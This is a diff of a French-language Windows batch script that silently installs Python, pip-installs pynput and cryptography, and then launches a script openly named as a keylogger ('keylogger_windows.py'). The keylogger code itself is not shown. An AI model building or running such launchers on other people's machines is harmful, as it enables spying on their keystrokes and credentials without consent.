@@ -6,22 +6,25 @@ echo.
 echo ========================================================
 echo      INSTALLATION DE PYTHON (METHODE DIRECTE)
 echo ========================================================
-echo [INFO] Ce script doit etre execute en Administrateur.
+echo [INFO] Ce script DOIT etre execute en Administrateur.
 echo.
 
-:: 1. Verifie si Python est present
+:: 1. VERIFICATION PYTHON (Methode simple)
 python --version >nul 2>&1
 if %errorlevel% neq 0 (
     echo [ACTION] Telechargement de Python 3.11...
     
-    :: Telechargement de l'installateur avec curl (integre a Windows)
+    :: Telechargement de l'installateur (avec une vérification rapide)
+    where curl >nul 2>&1 || (echo [ERREUR] curl non trouve. Veuillez l'installer.)
+    if %errorlevel% neq 0 exit /B
+
     curl -o python_installer.exe https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe
     
     echo.
     echo [ACTION] Installation silencieuse en cours...
-    echo [INFO] Veuillez patienter, l'installateur s'execute en arriere-plan...
+    echo [INFO] Patientez. L'installateur s'execute en arriere-plan...
     
-    :: Installation silencieuse. C'est l'etape qui echouait.
+    :: Installation silencieuse. Important pour que le PATH soit mis a jour.
     start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
     
     :: Nettoyage
@@ -29,21 +32,26 @@ if %errorlevel% neq 0 (
     
     echo.
     echo [SUCCES] Python installe.
+    echo.
 ) else (
     echo [OK] Python est deja present.
 )
 
 
-:: 2. VERIFICATION FINALE ET LANCEMENT
+:: 2. DEPENDANCES ET LANCEMENT
 echo.
 echo ========================================================
 
-:: Utilisation de la nouvelle instance Python
-python -m pip install pynput cryptography
+:: Installation de pynput
+echo [ACTION] Installation des dependances...
+pip install pynput cryptography
 
 if %errorlevel% equ 0 (
     echo [SUCCES] Pynput installe.
     echo [LANCEMENT] Demarrage du Keylogger...
+    echo.
+    echo    >>> FERMEZ CETTE FENETRE POUR ARRETER LE KEYLOGGER <<<
+    echo.
     python keylogger_windows.py
 ) else (
     color 0C
